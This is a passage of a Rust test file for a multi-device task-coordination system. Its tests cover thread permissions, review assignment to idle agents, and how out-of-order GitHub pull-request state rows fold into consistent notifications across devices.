        n.to == [CARD1, CARD2] && n.text.contains("started a thread"),
        "{n:?}"
    );
    assert_eq!(b.c.thread_to(&tk.id), [CARD1, CARD2]);

    // p2 (a person) comments: not an answer, so it is still unanswered.
    // Nobody waits on the named agents (card #512): the first sweep finds
    // no agent free, so it is unclaimed (p1's device starts its agent when
    // spawning is on).
    b.c.person_comment(P2, &tk.id, "I'd like to know too.", false, &[], None)
        .unwrap();
    sync(&a, &b);
    a.c.sweep_asks(&[]).unwrap();
    let ask = a.c.get_task(&tk.id).unwrap().ask.unwrap();
    assert!(
        ask.reason == "unclaimed" && ask.unclaimed && ask.taker.is_empty(),
        "{ask:?}"
    );

    // One idle agent of either person gets it, at once; here p2's card3.
    let ns = a.c.sweep_asks(&[idle(CARD3, "dev-b")]).unwrap();
    assert!(
        ns.len() == 1 && ns[0].to == [CARD3] && ns[0].text.contains("handed it to you"),
        "{ns:?}"
    );
    sync(&a, &b);
    assert_eq!(b.c.get_task(&tk.id).unwrap().ask.unwrap().taker, CARD3);
    // p2's device never writes the thread's take rows.
    b.c.sweep_asks(&[idle(CARD3, "dev-b")]).unwrap();

    // card3 answers on p2's device: answered on both, nobody holds it.
    b.c.add_comment(CARD3, &tk.id, "Yes, merged an hour ago.", false)
        .unwrap();
    sync(&a, &b);
    a.c.sweep_asks(&[]).unwrap();
    sync(&a, &b);
    for s in [&a, &b] {
        let t = s.c.get_task(&tk.id).unwrap();
        let ask = t.ask.unwrap();
        assert!(ask.reason == "answered" && ask.taker.is_empty(), "{ask:?}");
        assert!(t.holders.is_empty());
        assert_eq!(s.c.thread_to(&tk.id), [CARD3], "the follow-up's audience");
    }

    // p1's follow-up from dev-a reaches card3 (p2's agent hears it through
    // its own device's bridge, from thread_to).
    let (_, ns) =
        a.c.person_comment(
            P1,
            &tk.id,
            "Thanks, and the docs?",
            true,
            &[],
            Some(&|_| false),
        )
        .unwrap();
    assert!(ns.len() == 1 && ns[0].to == [CARD3] && ns[0].wake, "{ns:?}");

    // Agents and the other member don't resolve it; p1 does.
    let close = |s: &Side, by: &str| {
        s.c.ask_close(
            by,
            &tk.id,
            AskOutcome {
                kind: OUTCOME_ANSWERED.into(),
                note: "done".into(),
                ..AskOutcome::default()
            },
        )
    };
    assert!(close(&b, CARD3).is_err());
    assert!(
        b.c.resolve_thread(P2, &tk.id).is_err(),
        "p2 didn't start it"
    );
    assert!(close(&b, P2).is_err(), "nor ask_close it");
    let t = a.c.resolve_thread(P1, &tk.id).unwrap();
    assert!(is_terminal(&t.state), "{t:?}");
    sync(&a, &b);
    assert!(is_terminal(&b.c.get_task(&tk.id).unwrap().state));

    // Reopening is the starter's too (card #169); it's live on both sides.
    assert!(b.c.reopen_thread(P2, &tk.id).is_err(), "p2 didn't start it");
    a.c.reopen_thread(P1, &tk.id).unwrap();
    sync(&a, &b);
    for s in [&a, &b] {
        let t = s.c.get_task(&tk.id).unwrap();
        assert!(t.open_ask().is_some_and(|a| a.thread), "{t:?}");
        assert_eq!(s.c.thread_to(&tk.id), [CARD3]);
    }
}

// ---- an open agent of another person reviews (card #191) -------------------

struct FixedRoster(Vec<AgentCard>);

impl Agents for FixedRoster {
    fn agents(&self) -> Vec<AgentCard> {
        self.0.clone()
    }
}

/// Side s reopened with a roster of the board's agents.
fn side_with_roster(s: Side, person: &str, owners: &Owners, agents: Vec<AgentCard>) -> Side {
    let me = person.to_string();
    let o2 = owners.clone();
    let o = Options {
        now: Some(s.clk.func()),
        board: true,
        person: person.into(),
        is_owner: Some(Arc::new(move |k: &str| k == me)),
        key_person: Some(Arc::new(key_person)),
        device_person: Some(Arc::new(device_person)),
        tag: Some(Arc::new(|| "mlg".to_string())),
        board_owner: Some(Arc::new(move |p: &str, at: Option<&RowPos>| {
            o2.lock().unwrap().iter().any(|(who, from, until)| {
                who == p && at.map_or(*until == u64::MAX, |at| *from < at.hlc && at.hlc < *until)
            })
        })),
        ..Options::default()
    };
    let r: Arc<dyn Agents> = Arc::new(FixedRoster(agents));
    let c = Coord::new(s.st.clone(), Some(r), o).unwrap();
    Side { c, ..s }
}

#[test]
fn with_nobody_dedicated_a_free_agent_of_another_person_reviews() {
    let (a, b, owners) = two_people();
    let t = shared_card(&a, &b);
    a.c.add_link(CARD1, &t.id, PR).unwrap();
    sync(&a, &b);
    // c1 is p1's own (idle, never chosen); c2 is p2's and busy; c3 is p2's
    // and idle: the request goes to c3.
    let a = side_with_roster(a, P1, &owners, roster(&[CARD1, CARD3]));
    let (r, n) = a.c.request_review(CARD1, &t.id, PR, "").unwrap();
    assert_eq!(r.len(), 1);
    assert_eq!((r[0].from.as_str(), r[0].to.as_str()), (CARD1, CARD3));
    assert_eq!(n.to, vec![CARD3.to_string()]);
    // The holder's request put the card in review.
    assert_eq!(a.c.get_task(&t.id).unwrap().state, IN_REVIEW);

    // Nobody of p2's free: refused, as before.
    let t2 = shared_card(&a, &b);
    a.c.add_link(CARD1, &t2.id, PR).unwrap();
    let a = side_with_roster(a, P1, &owners, roster(&[CARD1]));
    let e = a.c.request_review(CARD1, &t2.id, PR, "").unwrap_err();
    assert!(e.is(ErrorKind::NotFound), "{e}");
}

// ---- a card's PR state on a board (#208, #210) ------------------------------

/// Card #542: rows come device by device, so a device back online can hear
/// the merge before the card. Nobody writes a settled PR's row again, so
/// it has to wait for the card, not go.
#[test]
fn a_merge_heard_before_its_card_waits_for_it() {
    const PR: &str = "https://github.com/a/b/pull/7";
    let (a, b, owners) = two_people();
    let c = side_with("dev-a2", P1, &owners, false);
    pull(&a, &c);
    pull(&b, &c);

    let t = a.c.create_task(P1, nt("ship it", "")).unwrap();
    sync(&a, &b);
    b.c.claim_task(CARD2, &t.id).unwrap();
    b.c.add_link(CARD2, &t.id, PR).unwrap();
    b.clk.add(Duration::from_secs(60));
    b.c.record_pr_state(
        &t.id,
        PrCheck {
            pr: PR.into(),
            state: PR_MERGED.into(),
            ..PrCheck::default()
        },
    )
    .unwrap();

    // dev-b's rows first, then dev-a's card.
    let ahead: Vec<_> =
        b.st.missing(&c.st.vector().unwrap(), 1000)
            .unwrap()
            .into_iter()
            .filter(|r| r.device_id == "dev-b")
            .collect();
    assert!(ahead.iter().any(|r| r.kind == kinds::PR_STATE));
    let (_, r) = c.st.insert_batch(&ahead);
    r.unwrap();
    c.c.fold_live(&ahead);
    assert!(c.c.pr_state(&t.id, PR).is_none());

    pull(&a, &c);
    assert_eq!(c.c.pr_state(&t.id, PR).unwrap().state, PR_MERGED);
}

/// Card #548: rows come device by device, so a pr.state row can arrive
/// where its card is known but the holder's row isn't yet. It is kept and
/// folds when the holder's does; nothing would write a merged PR's row
/// again.
#[test]
fn a_pr_row_ahead_of_its_holder_folds_when_the_holder_does() {
    const PR: &str = "https://github.com/a/b/pull/7";
    let (a, b, owners) = two_people();
    let b2 = side_with("dev-b2", P2, &owners, false);
    let far = side_with("dev-a2", P1, &owners, false);
    pull(&a, &b2);
    pull(&b, &b2);
    pull(&a, &far);
    pull(&b, &far);

    let t = a.c.create_task(P1, nt("ship it", "")).unwrap();
    pull(&a, &far);
    pull(&a, &b);
    b.c.claim_task(CARD2, &t.id).unwrap();
    b.c.add_link(CARD2, &t.id, PR).unwrap();
    pull(&a, &b2);
    pull(&b, &b2);
    b2.clk.add(Duration::from_secs(60));
    b2.c.record_pr_state(
        &t.id,
        PrCheck {
            pr: PR.into(),
            state: PR_MERGED.into(),
            ..PrCheck::default()
        },
    )
    .unwrap();

    // dev-b2's row first: `far` knows the card, not that p2's agent holds it.
    let ahead: Vec<_> = b2
        .st
        .missing(&far.st.vector().unwrap(), 1000)
        .unwrap()
        .into_iter()
        .filter(|r| r.device_id == "dev-b2")
        .collect();
    assert!(ahead.iter().any(|r| r.kind == kinds::PR_STATE));
    let (_, r) = far.st.insert_batch(&ahead);
    r.unwrap();
    far.c.fold_live(&ahead);
    assert!(far.c.get_task(&t.id).is_some());
    assert!(far.c.pr_state(&t.id, PR).is_none());

    pull(&b, &far);
    assert_eq!(far.c.pr_state(&t.id, PR).unwrap().state, PR_MERGED);
}

/// Card #548: the same for a wait, raised on one device of the person and
/// polled from another. (The raiser held the card, so its claim lets the
/// row in first; either counts for good.)
#[test]
fn a_pr_row_ahead_of_its_wait_folds_when_the_wait_does() {
    const PR: &str = "https://github.com/a/b/pull/41";
    let (a, b, owners) = two_people();
    let b2 = side_with("dev-b2", P2, &owners, false);
    pull(&a, &b2);
    pull(&b, &b2);

    let t = a.c.create_task(P1, nt("part 10", "")).unwrap();
    sync(&a, &b);
    pull(&a, &b2);
    b.c.claim_task(CARD2, &t.id).unwrap();
    b.c.block(
        CARD2,
        &t.id,
        "Review and merge PR #41",
        Some(BlockedBy {
            kind: BLOCKED_ON_EXTERNAL.into(),
            reference: PR.into(),
        }),
    )
    .unwrap();
    b.c.leave(CARD2, &t.id, CARD2).unwrap();
    pull(&b, &b2);
    b2.clk.add(Duration::from_secs(60));
    let merged = PrCheck {
        pr: PR.into(),
        state: PR_MERGED.into(),
        ..PrCheck::default()
    };
    b2.c.record_pr_state(&t.id, merged.clone()).unwrap();

    let ahead: Vec<_> = b2
        .st
        .missing(&a.st.vector().unwrap(), 1000)
        .unwrap()
        .into_iter()
        .filter(|r| r.device_id == "dev-b2")
        .collect();
    let (_, r) = a.st.insert_batch(&ahead);
    r.unwrap();
    a.c.fold_live(&ahead);
    assert!(a.c.pr_state(&t.id, PR).is_none());
    pull(&b, &a);
    assert_eq!(a.c.pr_state(&t.id, PR).unwrap().state, PR_MERGED);
}

/// Card #548, third review: who vouches for a pr.state row is everyone
/// who ever held the card, so a row that comes after the holder's leave
/// still folds, as it does when the log is replayed in order.
#[test]
fn a_pr_row_after_its_holders_leave_still_folds() {
    const PR: &str = "https://github.com/a/b/pull/8";
    let (a, b, owners) = two_people();
    let b2 = side_with("dev-b2", P2, &owners, false);
    let far = side_with("dev-a2", P1, &owners, false);
    for s in [&b2, &far] {
        pull(&a, s);
        pull(&b, s);
    }
    let t = a.c.create_task(P1, nt("ship it", "")).unwrap();
    pull(&a, &b);
    b.c.claim_task(CARD2, &t.id).unwrap();
    b.c.add_link(CARD2, &t.id, PR).unwrap();
    pull(&a, &b2);
    pull(&b, &b2);
    b2.clk.add(Duration::from_secs(60));
    b2.c.record_pr_state(&t.id, pr_check(PR, PR_MERGED, ""))
        .unwrap();
    b.c.leave(CARD2, &t.id, CARD2).unwrap();

    // `far` hears the claim and the leave, then the merge.
    pull(&a, &far);
    pull_dev(&b, &far, "dev-b");
    assert!(far.c.get_task(&t.id).unwrap().holders.is_empty());
    pull_dev(&b2, &far, "dev-b2");
    assert_eq!(far.c.pr_state(&t.id, PR).unwrap().state, PR_MERGED);
    assert_eq!(
        replayed(&far, P1, &owners)
            .pr_state(&t.id, PR)
            .unwrap()
            .state,
        PR_MERGED
    );
}

/// Card #548, third review: rows kept ahead of the holder are kept whole,
/// so a closing and its reopen both count once the holder folds: the
/// news names the reopen there as on the writer, and after a replay.
#[test]
fn pr_rows_kept_ahead_of_the_holder_keep_their_history() {
    const PR: &str = "https://github.com/a/b/pull/9";
    let (a, b, owners) = two_people();
    let b2 = side_with("dev-b2", P2, &owners, false);
    let far = side_with("dev-a2", P1, &owners, false);
    for s in [&b2, &far] {
        pull(&a, s);
        pull(&b, s);
    }
    let t = a.c.create_task(P1, nt("ship it", "")).unwrap();
    pull(&a, &far);
    pull(&a, &b);
    b.c.claim_task(CARD2, &t.id).unwrap();
    b.c.add_link(CARD2, &t.id, PR).unwrap();
    pull(&a, &b2);
    pull(&b, &b2);
    for state in [PR_CLOSED, PR_OPEN] {
        b2.clk.add(Duration::from_secs(60));
        b2.c.record_pr_state(&t.id, pr_check(PR, state, ""))
            .unwrap();
    }
    let want = b2.c.pr_news();
    assert_eq!(want.len(), 1);
    assert!(want[0].mark.contains("Reopened#1"), "{}", want[0].mark);

    pull_dev(&b2, &far, "dev-b2");
    assert!(far.c.pr_state(&t.id, PR).is_none(), "kept, not folded");
    pull_dev(&b, &far, "dev-b");
    let marks = |c: &Coord| c.pr_news().into_iter().map(|n| n.mark).collect::<Vec<_>>();
    assert_eq!(marks(&far.c), vec![want[0].mark.clone()]);
    assert_eq!(
        marks(&replayed(&far, P1, &owners)),
        vec![want[0].mark.clone()]
    );
}

/// Card #548: what each device owes its own agents, as the fold has it:
/// the same on every device whatever order two writers' rows came in,
/// naming both, and one mark for a merge however many heard it.
#[test]
fn pr_news_names_every_writer_and_one_mark_per_change() {
    const PR: &str = "https://github.com/a/b/pull/7";
    let (a, b, owners) = two_people();
    let b2 = side_with("dev-b2", P2, &owners, false);
    let a2 = side_with("dev-a2", P1, &owners, false);
    for s in [&b2, &a2] {
        pull(&a, s);
        pull(&b, s);
    }
    let t = a.c.create_task(P1, nt("ship it", "")).unwrap();
    pull(&a, &b);
    b.c.claim_task(CARD2, &t.id).unwrap();
    b.c.add_link(CARD2, &t.id, PR).unwrap();
    for s in [&a, &b2, &a2] {
        pull(&a, s);
        pull(&b, s);
    }
    let heard = |state: &str, review: &str| PrCheck {
        pr: PR.into(),
        state: state.into(),
        review: review.into(),
        ..PrCheck::default()
    };

    // An open PR is nobody's news.
    b.clk.add(Duration::from_secs(60));
    b.c.record_pr_state(&t.id, heard(PR_OPEN, "")).unwrap();
    pull(&b, &a);
    assert!(a.c.pr_news().is_empty());

    // Both of p2's devices hear the merge before either's row crosses,
    // with different reviews, and the two sides take them in either order.
    pull(&b, &b2);
    b.clk.add(Duration::from_secs(60));
    b2.clk.add(Duration::from_secs(90));
    b.c.record_pr_state(&t.id, heard(PR_MERGED, "APPROVED"))
        .unwrap();
    b2.c.record_pr_state(&t.id, heard(PR_MERGED, "")).unwrap();
    pull(&b, &a);
    pull(&b2, &a);
    pull(&b2, &a2);
    pull(&b, &a2);
    let (n1, n2) = (a.c.pr_news(), a2.c.pr_news());
    assert_eq!((n1.len(), n2.len()), (1, 1));
    assert_eq!(n1[0].mark, n2[0].mark);
    let mut w: Vec<_> = n1[0].writers.clone();
    w.sort();
    assert_eq!(w, vec!["dev-b", "dev-b2"]);
    let mut w: Vec<_> = n2[0].writers.clone();
    w.sort();
    assert_eq!(w, vec!["dev-b", "dev-b2"]);
    assert_eq!(n1[0].notice.to, vec![CARD2.to_string()]);
    assert!(n1[0].notice.wake);
    assert!(n1[0].notice.text.contains("was merged"));

    // A card done is nobody's news either.
    a.c.set_task_state(P1, &t.id, COMPLETED, "done").unwrap();
    assert!(a.c.pr_news().is_empty());
}

/// Card #548: a closed PR can come round again, so each closing and the
/// reopen between them are news of their own; a device's error on the
/// same state isn't, and doesn't count as hearing it.
#[test]
fn pr_news_tells_each_closing_and_a_reopen_apart() {
    const PR: &str = "https://github.com/a/b/pull/7";
    let (a, b, _) = two_people();
    let t = a.c.create_task(P1, nt("ship it", "")).unwrap();
    sync(&a, &b);
    b.c.claim_task(CARD2, &t.id).unwrap();
    b.c.add_link(CARD2, &t.id, PR).unwrap();
    sync(&a, &b);
    let heard = |state: &str| PrCheck {
        pr: PR.into(),
        state: state.into(),
        ..PrCheck::default()
    };
    let step = |state: &str| {
        b.clk.add(Duration::from_secs(60));
        b.c.record_pr_state(&t.id, heard(state)).unwrap();
        sync(&a, &b);
        a.c.pr_news()
    };
    let first = step(PR_CLOSED);
    assert_eq!(first.len(), 1);
    assert!(first[0].notice.text.contains("closed without merging"));
    let reopened = step(PR_OPEN);
    assert_eq!(reopened.len(), 1);
    assert!(reopened[0].notice.text.contains("was reopened"));
    assert!(!reopened[0].notice.wake);
    assert_ne!(first[0].mark, reopened[0].mark);

    // gh failing here on the open PR changes nothing the agents hear.
    b.clk.add(Duration::from_secs(60));
    b.c.record_pr_state(
        &t.id,
        PrCheck {
            pr: PR.into(),
            error: "gh broke".into(),
            ..PrCheck::default()
        },
    )
    .unwrap();
    sync(&a, &b);
    let same = a.c.pr_news();
    assert_eq!(same[0].mark, reopened[0].mark);
    assert_eq!(a.c.pr_state(&t.id, PR).unwrap().error, "gh broke");

    let second = step(PR_CLOSED);
    assert_ne!(first[0].mark, second[0].mark);
}

/// Card #548, from the review: a device that couldn't sync or reach GitHub
/// fails on a PR it still thinks open, after another device heard it
/// closed. Its later error row must not undo the closing on any device.
#[test]
fn a_stale_error_row_never_undoes_a_closing() {
    const PR: &str = "https://github.com/a/b/pull/7";
    let (a, b, owners) = two_people();
    let b2 = side_with("dev-b2", P2, &owners, false);
    pull(&a, &b2);
    pull(&b, &b2);
    let t = a.c.create_task(P1, nt("ship it", "")).unwrap();
    sync(&a, &b);
    b.c.claim_task(CARD2, &t.id).unwrap();
    b.c.add_link(CARD2, &t.id, PR).unwrap();
    let heard = |state: &str| PrCheck {
        pr: PR.into(),
        state: state.into(),
        ..PrCheck::default()
    };
    b.clk.add(Duration::from_secs(60));
    b.c.record_pr_state(&t.id, heard(PR_OPEN)).unwrap();
    pull(&a, &b2);
    pull(&b, &b2);

    b.clk.add(Duration::from_secs(60));
    b.c.record_pr_state(&t.id, heard(PR_CLOSED)).unwrap();
    b2.clk.add(Duration::from_secs(300));
    b2.c.record_pr_state(
        &t.id,
        PrCheck {
            pr: PR.into(),
            error: "gh: no network".into(),
            ..PrCheck::default()
        },
    )
    .unwrap();
    assert_eq!(b2.c.pr_state(&t.id, PR).unwrap().error, "gh: no network");

    sync(&b, &b2);
    pull(&b2, &a);
    pull(&b, &a);
    for s in [&a, &b, &b2] {
        let st = s.c.pr_state(&t.id, PR).unwrap();
        assert_eq!(st.state, PR_CLOSED);
        assert!(st.error.is_empty(), "{st:?}");
    }
    let news = a.c.pr_news();
    assert_eq!(news.len(), 1);
    assert_eq!(news[0].writers, vec!["dev-b"], "an error is nobody's word");
}

/// Card #548, from the review: a row that comes late to a run of the same
/// news moves nothing, so a tick between the two doesn't tell it twice,
/// and a device folding the same rows the other way round agrees.
#[test]
fn a_late_row_of_the_same_news_keeps_its_mark() {
    const PR: &str = "https://github.com/a/b/pull/7";
    let (a, b, owners) = two_people();
    let b2 = side_with("dev-b2", P2, &owners, false);
    let a2 = side_with("dev-a2", P1, &owners, false);
    for s in [&b2, &a2] {
        pull(&a, s);
        pull(&b, s);
    }
    let t = a.c.create_task(P1, nt("ship it", "")).unwrap();
    pull(&a, &b);
    b.c.claim_task(CARD2, &t.id).unwrap();
    b.c.add_link(CARD2, &t.id, PR).unwrap();
    for s in [&a, &b2, &a2] {
        pull(&a, s);
        pull(&b, s);
    }
    let closed = PrCheck {
        pr: PR.into(),
        state: PR_CLOSED.into(),
        ..PrCheck::default()
    };
    b.clk.add(Duration::from_secs(60));
    b2.clk.add(Duration::from_secs(90));
    b.c.record_pr_state(&t.id, closed.clone()).unwrap();
    b2.c.record_pr_state(&t.id, closed).unwrap();

    // The later row first: the tick sees it, then the earlier one lands.
    pull(&b2, &a);
    let first = a.c.pr_news();
    pull(&b, &a);
    let after = a.c.pr_news();
    pull(&b, &a2);
    pull(&b2, &a2);
    let other = a2.c.pr_news();
    assert_eq!(first[0].mark, after[0].mark);
    assert_eq!(first[0].mark, other[0].mark);
    assert_eq!(after[0].writers, vec!["dev-b", "dev-b2"]);
}

/// Takes only `dev`'s rows from `from` to `to`.
fn pull_dev(from: &Side, to: &Side, dev: &str) {
    let rows: Vec<_> = from
        .st
        .missing(&to.st.vector().unwrap(), 1000)
        .unwrap()
        .into_iter()
        .filter(|r| r.device_id == dev)
        .collect();
    let (_, r) = to.st.insert_batch(&rows);
    r.unwrap();
    to.c.fold_live(&rows);
}

/// Four sides on one card held by p2's agent, every row of it everywhere.
fn four_sides(pr: &str) -> (Side, Side, Side, Side, Task) {
    let (a, b, owners) = two_people();
    let b2 = side_with("dev-b2", P2, &owners, false);
    let a2 = side_with("dev-a2", P1, &owners, false);
    for s in [&b2, &a2] {
        pull(&a, s);
        pull(&b, s);
    }
    let t = a.c.create_task(P1, nt("ship it", "")).unwrap();
    pull(&a, &b);
    b.c.claim_task(CARD2, &t.id).unwrap();
    b.c.add_link(CARD2, &t.id, pr).unwrap();
    for s in [&a, &b2, &a2] {
        pull(&a, s);
        pull(&b, s);
    }
    (a, b, b2, a2, t)
}

fn pr_check(pr: &str, state: &str, review: &str) -> PrCheck {
    PrCheck {
        pr: pr.into(),
        state: state.into(),
        review: review.into(),
        ..PrCheck::default()
    }
}

/// Card #548, second review: a late row from before a closing adds a run
/// ahead of it, but no closing, so the mark stays and nobody is told twice.
#[test]
fn a_late_row_from_before_the_news_keeps_its_mark() {
    const PR: &str = "https://github.com/a/b/pull/7";
    let (a, b, b2, _, t) = four_sides(PR);
    b.clk.add(Duration::from_secs(60));
    b2.clk.add(Duration::from_secs(90));
    b.c.record_pr_state(&t.id, pr_check(PR, PR_OPEN, ""))
        .unwrap();
    b2.c.record_pr_state(&t.id, pr_check(PR, PR_CLOSED, ""))
        .unwrap();
    pull_dev(&b2, &a, "dev-b2");
    let first = a.c.pr_news();
    pull_dev(&b, &a, "dev-b");
    assert_eq!(a.c.pr_news()[0].mark, first[0].mark);
}

/// Card #548, second review: a reopen and a review after it in one sync is
/// still a reopen.
#[test]
fn a_review_after_a_reopen_doesnt_hide_it() {
    const PR: &str = "https://github.com/a/b/pull/7";
    let (a, b, _, _, t) = four_sides(PR);
    for (state, review) in [(PR_CLOSED, ""), (PR_OPEN, ""), (PR_OPEN, "APPROVED")] {
        b.clk.add(Duration::from_secs(60));
        b.c.record_pr_state(&t.id, pr_check(PR, state, review))
            .unwrap();
    }
    pull(&b, &a);
    let news = a.c.pr_news();
    assert_eq!(news.len(), 1);
    assert!(news[0].notice.text.contains("was reopened"));

    // Changes requested and answered since: over.
    for review in [PR_CHANGES_REQUESTED, "APPROVED"] {
        b.clk.add(Duration::from_secs(60));
        b.c.record_pr_state(&t.id, pr_check(PR, PR_OPEN, review))
            .unwrap();
    }
    pull(&b, &a);
    assert!(a.c.pr_news().is_empty());
}

/// Card #548, third review: an OPEN from a device that hadn't heard of
/// the closing is stale, not a reopen: the PR stays closed on every
/// device, whichever row came first, and nobody hears "reopened".
#[test]
fn an_open_from_a_device_that_missed_the_closing_is_no_reopen() {
    const PR: &str = "https://github.com/a/b/pull/7";
    let (a, b, b2, a2, t) = four_sides(PR);
    b.c.record_pr_state(&t.id, pr_check(PR, PR_OPEN, ""))
        .unwrap();
    for s in [&a, &b2, &a2] {
        pull(&b, s);
    }
    b.clk.add(Duration::from_secs(60));
    b.c.record_pr_state(&t.id, pr_check(PR, PR_CLOSED, ""))
        .unwrap();
    // dev-b2 hasn't heard: to it the review is news.
    b2.clk.add(Duration::from_secs(120));
    b2.c.record_pr_state(&t.id, pr_check(PR, PR_OPEN, "APPROVED"))
        .unwrap();
    pull_dev(&b2, &a, "dev-b2");
    pull_dev(&b, &a, "dev-b");
    pull_dev(&b, &a2, "dev-b");
    pull_dev(&b2, &a2, "dev-b2");
    for c in [&a.c, &a2.c] {
        assert_eq!(c.pr_state(&t.id, PR).unwrap().state, PR_CLOSED);
        let news = c.pr_news();
        assert_eq!(news.len(), 1);
        assert!(news[0].mark.ends_with("Closed#1"), "{}", news[0].mark);
    }
}

/// Card #548, third review: two devices that each heard the reopen, with
/// different reviews, both told their own agents: the news names both.
#[test]
fn a_reopen_two_devices_heard_names_both() {
    const PR: &str = "https://github.com/a/b/pull/7";
    let (a, b, b2, _, t) = four_sides(PR);
    b.c.record_pr_state(&t.id, pr_check(PR, PR_CLOSED, ""))
        .unwrap();
    pull(&b, &b2);
    b.clk.add(Duration::from_secs(60));
    b.c.record_pr_state(&t.id, pr_check(PR, PR_OPEN, ""))
        .unwrap();
    b2.clk.add(Duration::from_secs(120));
    let (_, ns) =
        b2.c.record_pr_state(&t.id, pr_check(PR, PR_OPEN, "APPROVED"))
            .unwrap();
    assert!(ns[0].text.contains("was reopened"));
    pull(&b, &a);
    pull(&b2, &a);
    let news = a.c.pr_news();
    assert_eq!(news.len(), 1);
    assert!(news[0].mark.ends_with("Reopened#1"), "{}", news[0].mark);
    assert_eq!(news[0].writers, vec!["dev-b", "dev-b2"]);
}

/// Card #548, second review: gh's error shows beside OPEN on every device,
/// whichever of the two rows came first.
#[test]
fn an_error_beside_open_shows_in_any_arrival_order() {
    const PR: &str = "https://github.com/a/b/pull/7";
    let (a, b, b2, a2, t) = four_sides(PR);
    b.clk.add(Duration::from_secs(60));
    b.c.record_pr_state(&t.id, pr_check(PR, PR_OPEN, ""))
        .unwrap();
    pull(&b, &b2);
    b2.clk.add(Duration::from_secs(120));
    b2.c.record_pr_state(
        &t.id,
        PrCheck {
            pr: PR.into(),
            error: "gh broke".into(),
            ..PrCheck::default()
        },
    )
    .unwrap();
    // `a` takes the OPEN first, `a2` the error first.
    pull_dev(&b, &a, "dev-b");
    pull_dev(&b2, &a, "dev-b2");
    pull_dev(&b2, &a2, "dev-b2");
    pull_dev(&b, &a2, "dev-b");
    for s in [&a, &a2] {
        let st = s.c.pr_state(&t.id, PR).unwrap();
        assert_eq!(
            (st.state.as_str(), st.error.as_str()),
            (PR_OPEN, "gh broke")
        );
    }
}

/// Card #548, third review: a device whose clock is behind the error's
/// stamps its answer after what it read, so one row clears the error and
/// the next polls write nothing; a reopen it sees sorts after the closing.
#[test]
fn a_device_behind_another_s_clock_stamps_after_what_it_read() {
    const PR: &str = "https://github.com/a/b/pull/7";
    let (a, b, b2, _, t) = four_sides(PR);
    b.c.record_pr_state(&t.id, pr_check(PR, PR_OPEN, ""))
        .unwrap();
    pull(&b, &b2);
    b2.clk.add(Duration::from_secs(600));
    b2.c.record_pr_state(
        &t.id,
        PrCheck {
            pr: PR.into(),
            error: "gh broke".into(),
            ..PrCheck::default()
        },
    )
    .unwrap();
    pull(&b2, &b);
    let rows = || {
        b.st.missing(&store::Vector::default(), 10_000)
            .unwrap()
            .len()
    };
    let before = rows();
    for _ in 0..3 {
        b.clk.add(Duration::from_secs(60));
        b.c.record_pr_state(&t.id, pr_check(PR, PR_OPEN, ""))
            .unwrap();
    }
    assert_eq!(rows(), before + 1, "one row clears it");
    assert!(b.c.pr_state(&t.id, PR).unwrap().error.is_empty());

    // Closed on the device ahead; reopened as heard on the one behind.
    b2.clk.add(Duration::from_secs(60));
    pull(&b, &b2);
    b2.c.record_pr_state(&t.id, pr_check(PR, PR_CLOSED, ""))
        .unwrap();
    pull(&b2, &b);
    let (_, ns) =
        b.c.record_pr_state(&t.id, pr_check(PR, PR_OPEN, ""))
            .unwrap();
    assert!(ns[0].text.contains("was reopened"), "{}", ns[0].text);
    pull(&b, &a);
    pull(&b2, &a);
    assert_eq!(a.c.pr_state(&t.id, PR).unwrap().state, PR_OPEN);
}

/// Card #548, third review: a reopen counts as told only by a device that
/// saw it; one of the same person that only wrote a review since told
/// nobody, so the news still names only the reopen's writer.
#[test]
fn a_review_written_after_a_reopen_doesnt_count_as_telling_it() {
    const PR: &str = "https://github.com/a/b/pull/7";
    let (a, b, b2, _, t) = four_sides(PR);
    b.c.record_pr_state(&t.id, pr_check(PR, PR_CLOSED, ""))
        .unwrap();
    pull(&b, &b2);
    b.clk.add(Duration::from_secs(60));
    b.c.record_pr_state(&t.id, pr_check(PR, PR_OPEN, ""))
        .unwrap();
    pull(&b, &b2);
    b2.clk.add(Duration::from_secs(120));
    b2.c.record_pr_state(&t.id, pr_check(PR, PR_OPEN, "APPROVED"))
        .unwrap();
    pull(&b, &a);
    pull(&b2, &a);
    let news = a.c.pr_news();
    assert!(news[0].mark.ends_with("Reopened#1"), "{}", news[0].mark);
    assert_eq!(news[0].writers, vec!["dev-b"]);
}

/// Card #548, third review: changes requested after a closing are news,
/// even when the closing's row came late, after changes requested that a
/// device missing it had written.
#[test]
fn changes_requested_after_a_late_closing_are_news_again() {
    const PR: &str = "https://github.com/a/b/pull/7";
    let (a, b, b2, _, t) = four_sides(PR);
    b.c.record_pr_state(&t.id, pr_check(PR, PR_OPEN, ""))
        .unwrap();
    pull(&b, &b2);
    pull(&b, &a);
    b.clk.add(Duration::from_secs(60));
    b.c.record_pr_state(&t.id, pr_check(PR, PR_CLOSED, ""))
        .unwrap();
    b2.clk.add(Duration::from_secs(120));
    b2.c.record_pr_state(&t.id, pr_check(PR, PR_OPEN, PR_CHANGES_REQUESTED))
        .unwrap();
    pull_dev(&b2, &a, "dev-b2");
    let first = a.c.pr_news()[0].mark.clone();
    assert!(first.contains("ChangesRequested"), "{first}");
    pull_dev(&b, &a, "dev-b");
    assert!(a.c.pr_news()[0].mark.ends_with("Closed#1"));

    // dev-b2 hears the closing, then GitHub still says changes requested.
    pull(&b, &b2);
    b2.clk.add(Duration::from_secs(60));
    b2.c.record_pr_state(&t.id, pr_check(PR, PR_OPEN, PR_CHANGES_REQUESTED))
        .unwrap();
    pull_dev(&b2, &a, "dev-b2");
    let again = a.c.pr_news()[0].mark.clone();
    assert!(again.contains("ChangesRequested"), "{again}");
    assert_ne!(again, first);
}

/// Card #548, third review: changes requested heard on the device of a
/// member who neither made the card nor owns the board: the sweeper can't
/// move it back to working there, so the notice asks the holder to.
#[test]
fn changes_requested_on_a_members_device_asks_the_holder_to_move_the_card() {
    const PR: &str = "https://github.com/a/b/pull/7";
    let (a, b, _, _, t) = four_sides(PR);
    b.c.set_task_state(CARD2, &t.id, IN_REVIEW, "PR open")
        .unwrap();
    b.clk.add(Duration::from_secs(60));
    let (_, ns) =
        b.c.record_pr_state(&t.id, pr_check(PR, PR_OPEN, PR_CHANGES_REQUESTED))
            .unwrap();
    assert_eq!(b.c.get_task(&t.id).unwrap().state, IN_REVIEW);
    assert!(ns[0].text.contains("state=working"), "{}", ns[0].text);
    pull(&b, &a);
    let news = a.c.pr_news();
    assert!(
        news[0].notice.text.contains("state=working"),
        "{}",
        news[0].notice.text
    );
}

/// Card #548, second review: a device's error row kept beside its OPEN row
